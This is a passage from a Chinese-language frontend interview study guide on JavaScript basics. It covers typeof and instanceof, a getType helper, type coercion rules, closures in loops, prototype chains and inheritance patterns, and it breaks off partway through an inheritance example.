</code></pre></div><h2 id="_2-javascript"><a href="#_2-javascript" class="header-anchor">#</a> 2 JavaScript</h2> <h3 id="typeof类型判断"><a href="#typeof类型判断" class="header-anchor">#</a> typeof类型判断</h3> <blockquote><p><code>typeof</code> 是否能正确判断类型？<code>instanceof</code> 能正确判断对象的原理是什么</p></blockquote> <ul><li><code>typeof</code> 对于原始类型来说，除了 <code>null</code> 都可以显示正确的类型</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">typeof</span> <span class="token number">1</span> <span class="token comment">// 'number'</span>
<span class="token keyword">typeof</span> <span class="token string">'1'</span> <span class="token comment">// 'string'</span>
<span class="token keyword">typeof</span> <span class="token keyword">undefined</span> <span class="token comment">// 'undefined'</span>
<span class="token keyword">typeof</span> <span class="token boolean">true</span> <span class="token comment">// 'boolean'</span>
<span class="token keyword">typeof</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 'symbol'</span>
</code></pre></div><blockquote><p><code>typeof</code> 对于对象来说，除了函数都会显示 <code>object</code>，所以说 <code>typeof</code> 并不能准确判断变量到底是什么类型</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">typeof</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">// 'object'</span>
<span class="token keyword">typeof</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">// 'object'</span>
<span class="token keyword">typeof</span> console<span class="token punctuation">.</span>log <span class="token comment">// 'function'</span>
</code></pre></div><blockquote><p>如果我们想判断一个对象的正确类型，这时候可以考虑使用 <code>instanceof</code>，因为内部机制是通过原型链来判断的</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">Person</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">const</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
p1 <span class="token keyword">instanceof</span> <span class="token class-name">Person</span> <span class="token comment">// true</span>

<span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">'hello world'</span>
str <span class="token keyword">instanceof</span> <span class="token class-name">String</span> <span class="token comment">// false</span>

<span class="token keyword">var</span> str1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span>
str1 <span class="token keyword">instanceof</span> <span class="token class-name">String</span> <span class="token comment">// true</span>
</code></pre></div><blockquote><p>对于原始类型来说，你想直接通过 <code>instanceof</code>来判断类型是不行的</p></blockquote> <ul><li><code>typeof</code> <ul><li>直接在计算机底层基于数据类型的值（二进制）进行检测</li> <li><code>typeof null</code>为<code>object</code> 原因是对象存在在计算机中，都是以<code>000</code>开始的二进制存储，所以检测出来的结果是对象</li> <li><code>typeof</code> 普通对象/数组对象/正则对象/日期对象 都是<code>object</code></li> <li><code>typeof NaN === 'number'</code></li></ul></li> <li><code>instanceof</code> <ul><li>检测当前实例是否属于这个类的</li> <li>底层机制：只要当前类出现在实例的原型上，结果都是true</li> <li>不能检测基本数据类型</li></ul></li> <li><code>constructor</code> <ul><li>支持基本类型</li> <li><code>constructor</code>可以随便改，也不准</li></ul></li> <li><code>Object.prototype.toString.call([val])</code> <ul><li>返回当前实例所属类信息</li></ul></li></ul> <p><strong>写一个getType函数，获取详细的数据类型</strong></p> <ul><li><strong>获取类型</strong> <ul><li>手写一个<code>getType</code>函数，传入任意变量，可准确获取类型</li> <li>如<code>number</code>、<code>string</code>、<code>boolean</code>等值类型</li> <li>引用类型<code>object</code>、<code>array</code>、<code>map</code>、<code>regexp</code></li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 获取详细的数据类型
 * @param x x
 */</span>
<span class="token keyword">function</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> originType <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token comment">// '[object String]'</span>
  <span class="token keyword">const</span> spaceIndex <span class="token operator">=</span> originType<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> type <span class="token operator">=</span> originType<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>spaceIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 'String' -1不要右边的]</span>
  <span class="token keyword">return</span> type<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 'string'</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// null</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// undefined</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// number</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// string</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// boolean</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// symbol</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// object</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// array</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// function</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// date</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// regexp</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// map</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// set</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// weakmap</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WeakSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// weakset</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// error</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// promise</span>
</code></pre></div><h3 id="类型转换"><a href="#类型转换" class="header-anchor">#</a> 类型转换</h3> <blockquote><p>首先我们要知道，在 <code>JS</code> 中类型转换只有三种情况，分别是：</p></blockquote> <ul><li>转换为布尔值</li> <li>转换为数字</li> <li>转换为字符串</li></ul> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/07/1.png" loading="lazy" class="lazy"></p> <p><strong>转Boolean</strong></p> <blockquote><p>在条件判断时，除了 <code>undefined</code>，<code>null</code>， <code>false</code>， <code>NaN</code>， <code>''</code>， <code>0</code>， <code>-0</code>，其他所有值都转为 <code>true</code>，包括所有对象</p></blockquote> <p><strong>对象转原始类型</strong></p> <blockquote><p>对象在转换类型的时候，会调用内置的 <code>[[ToPrimitive]]</code> 函数，对于该函数来说，算法逻辑一般来说如下</p></blockquote> <ul><li>如果已经是原始类型了，那就不需要转换了</li> <li>调用 <code>x.valueOf()</code>，如果转换为基础类型，就返回转换的值</li> <li>调用 <code>x.toString()</code>，如果转换为基础类型，就返回转换的值</li> <li>如果都没有返回原始类型，就会报错</li></ul> <blockquote><p>当然你也可以重写 <code>Symbol.toPrimitive</code>，该方法在转原始类型时调用优先级最高。</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">0</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'1'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>toPrimitive<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">2</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token number">1</span> <span class="token operator">+</span> a <span class="token comment">// =&gt; 3</span>
</code></pre></div><p><strong>四则运算符</strong></p> <blockquote><p>它有以下几个特点：</p></blockquote> <ul><li>运算中其中一方为字符串，那么就会把另一方也转换为字符串</li> <li>如果一方不是字符串或者数字，那么会将它转换为数字或者字符串</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">'1'</span> <span class="token comment">// '11'</span>
<span class="token boolean">true</span> <span class="token operator">+</span> <span class="token boolean">true</span> <span class="token comment">// 2</span>
<span class="token number">4</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token comment">// &quot;41,2,3&quot;</span>
</code></pre></div><ul><li>对于第一行代码来说，触发特点一，所以将数字 <code>1</code> 转换为字符串，得到结果 <code>'11'</code></li> <li>对于第二行代码来说，触发特点二，所以将 <code>true</code> 转为数字 <code>1</code></li> <li>对于第三行代码来说，触发特点二，所以将数组通过 <code>toString</code>转为字符串 <code>1,2,3</code>，得到结果 <code>41,2,3</code></li></ul> <blockquote><p>另外对于加法还需要注意这个表达式 <code>'a' + + 'b'</code></p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token string">'a'</span> <span class="token operator">+</span> <span class="token operator">+</span> <span class="token string">'b'</span> <span class="token comment">// -&gt; &quot;aNaN&quot;</span>
</code></pre></div><ul><li>因为 <code>+ 'b'</code> 等于 <code>NaN</code>，所以结果为 <code>&quot;aNaN&quot;</code>，你可能也会在一些代码中看到过 <code>+ '1'</code>的形式来快速获取 <code>number</code> 类型。</li> <li>那么对于除了加法的运算符来说，只要其中一方是数字，那么另一方就会被转为数字</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token number">4</span> <span class="token operator">*</span> <span class="token string">'3'</span> <span class="token comment">// 12</span>
<span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">// 0</span>
<span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment">// NaN</span>
</code></pre></div><p><strong>比较运算符</strong></p> <ul><li>如果是对象，就通过 <code>toPrimitive</code> 转换对象</li> <li>如果是字符串，就通过 <code>unicode</code> 字符索引来比较</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">0</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'1'</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
a <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">// true</span>
</code></pre></div><blockquote><p>在以上代码中，因为 <code>a</code> 是对象，所以会通过 <code>valueOf</code> 转换为原始类型再比较值。</p></blockquote> <h3 id="闭包"><a href="#闭包" class="header-anchor">#</a> 闭包</h3> <blockquote><p>闭包的定义其实很简单：函数 <code>A</code> 内部有一个函数 <code>B</code>，函数 <code>B</code> 可以访问到函数 <code>A</code> 中的变量，那么函数 <code>B</code> 就是闭包</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token constant">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span>
  window<span class="token punctuation">.</span><span class="token function-variable function">B</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token constant">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token constant">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>
</code></pre></div><p><strong>闭包存在的意义就是让我们可以间接访问函数内部的变量</strong></p> <blockquote><p>经典面试题，循环中使用闭包解决 <code>var</code> 定义函数的问题</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

</code></pre></div><blockquote><p>首先因为 <code>setTimeout</code> 是个异步函数，所以会先把循环全部执行完毕，这时候 <code>i</code>就是 <code>6</code> 了，所以会输出一堆 <code>6</code></p></blockquote> <p><strong>解决办法有三种</strong></p> <ol><li>第一种是使用闭包的方式</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">j</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> j <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><blockquote><p>在上述代码中，我们首先使用了立即执行函数将 <code>i</code> 传入函数内部，这个时候值就被固定在了参数 <code>j</code> 上面不会改变，当下次执行 <code>timer</code> 这个闭包的时候，就可以使用外部函数的变量 <code>j</code>，从而达到目的</p></blockquote> <ol start="2"><li>第二种就是使用 <code>setTimeout</code> 的第三个参数，这个参数会被当成 <code>timer</code> 函数的参数传入</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span>
    <span class="token keyword">function</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token parameter">j</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    i <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span>
    i
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><ol start="3"><li>第三种就是使用 <code>let</code> 定义 <code>i</code> 了来解决问题了，这个也是最为推荐的方式</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> i <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="原型与原型链"><a href="#原型与原型链" class="header-anchor">#</a> 原型与原型链</h3> <p><strong>原型关系</strong></p> <ul><li>每个<code>class</code>都有显示原型<code>prototype</code></li> <li>每个实例都有隐式原型<code>__proto__</code></li> <li>实例的<code>__proto__</code>指向<code>class</code>的<code>prototype</code></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/6c4e92a507491e75.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 父类</span>
<span class="token keyword">class</span> <span class="token class-name">People</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
    <span class="token punctuation">}</span>
    <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> eat something</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 子类</span>
<span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">People</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>number <span class="token operator">=</span> number
  <span class="token punctuation">}</span>
  <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">姓名 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 学号 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>number<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 实例</span>
<span class="token keyword">const</span> xialuo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">'夏洛'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xialuo<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xialuo<span class="token punctuation">.</span>number<span class="token punctuation">)</span>
xialuo<span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xialuo<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>基于原型的执行规则</strong></p> <p>获取属性<code>xialuo.name</code>或执行方法<code>xialuo.sayhi</code>时，先在自身属性和方法查找，找不到就去<code>__proto__</code>中找</p> <p><strong>原型链</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">People</span><span class="token punctuation">.</span>prototype <span class="token operator">===</span> <span class="token class-name">Student</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__
</code></pre></div><p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/bc261ce998487d1e.png" loading="lazy" class="lazy"></p> <h3 id="原型继承和-class-继承"><a href="#原型继承和-class-继承" class="header-anchor">#</a> 原型继承和 Class 继承</h3> <blockquote><p>涉及面试题：原型如何实现继承？<code>Class</code> 如何实现继承？<code>Class</code> 本质是什么？</p></blockquote> <p>首先先来讲下 <code>class</code>，其实在 <code>JS</code>中并不存在类，<code>class</code> 只是语法糖，本质还是函数</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
Person <span class="token keyword">instanceof</span> <span class="token class-name">Function</span> <span class="token comment">// true</span>
</code></pre></div><p><strong>组合继承</strong></p> <blockquote><p>组合继承是最常用的继承方式</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> value
<span class="token punctuation">}</span>
<span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">getValue</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>val<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Child</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">Parent</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token class-name">Child</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> child <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Child</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

child<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>
child <span class="token keyword">instanceof</span> <span class="token class-name">Parent</span> <span class="token comment">// true</span>
</code></pre></div><ul><li>以上继承的方式核心是在子类的构造函数中通过 <code>Parent.call(this)</code> 继承父类的属性，然后改变子类的原型为 <code>new Parent()</code> 来继承父类的函数。</li> <li>这种继承方式优点在于构造函数可以传参，不会与父类引用属性共享，可以复用父类的函数，但是也存在一个缺点就是在继承父类函数的时候调用了父类构造函数，导致子类的原型上多了不需要的父类属性，存在内存上的浪费</li></ul> <p><strong>寄生组合继承</strong></p> <blockquote><p>这种继承方式对组合继承进行了优化，组合继承缺点在于继承父类函数时调用了构造函数，我们只需要优化掉这点就行了</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> value
<span class="token punctuation">}</span>
<span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">getValue</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>val<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Child</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">Parent</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
